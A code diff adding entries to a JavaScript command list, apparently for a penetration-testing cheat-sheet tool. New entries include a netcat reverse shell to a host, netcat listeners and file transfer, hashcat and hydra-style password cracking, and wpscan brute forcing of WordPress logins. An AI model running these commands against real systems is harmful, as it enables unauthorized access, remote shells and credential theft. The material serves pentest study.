@@ -159,13 +159,65 @@
         text: "hydra -L users.txt -P pass.txt $IP ssh"
       },
       {
-        title: "SSH",
-        text: "ssh -i id_rsa user@$IP"
-      },
-      {
         title: "john {Cracking FIle.}",
         text: "john --wordlist=/home/eshan/wordlist/rockyou.txt crackfile"
       },
+      {
+        "title": "TTY Shell",
+        "text": "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+    },
+    {
+        "title": "Netcat Remote Connection (Client)",
+        "text": "nc $IP $PORT"
+    },
+    {
+        "title": "Netcat Listening for Connections (Server)",
+        "text": "nc -lvnp $PORT"
+    },
+    {
+        "title": "Netcat File Transfer: Sender (Server)",
+        "text": "nc -nlvp $PORT > $FILE"
+    },
+    {
+        "title": "Netcat File Transfer: Receiver (Client)",
+        "text": "nc -nv $IP $PORT < $FILE"
+    },
+    {
+        "title": "Netcat Reverse Shell (Victim)",
+        "text": "nc $IP $PORT -e /bin/bash"
+    },
+    {
+        "title": "Hashcat",
+        "text": "hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt"
+    },
+    {
+        "title": "Hashcat Rule-based Attack (Best64)",
+        "text": "hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
+    },
+    {
+        "title": "Hashcat Rule-based Attack (Add Year)",
+        "text": "hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/add-year.rule"
+    },
+    {
+        "title": "Dirb{-o For Output File Name}",
+        "text": "dirb $URL -o dirb.txt"
+    },
+    {
+        "title": "SSH Connect to remote server with private key",
+        "text": "ssh -i $KEY_FILE $USER@$TARGET"
+    },
+    {
+        "title": "Wpscan Enumerating users",
+        "text": "wpscan --url http://<IP>/ --enumerate u"
+    },
+    {
+        "title": "Wpscan Bruteforcing passwords",
+        "text": "wpscan --url http://<IP>/ --password-attack wp-login -U admin -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt -t 50"
+    },
+    {
+        "title": "Rpcclient",
+        "text": "rpcclient -U \"\" $IP"
+    },
     ];
     const form = document.querySelector('form');
     const output = document.getElementById('output');
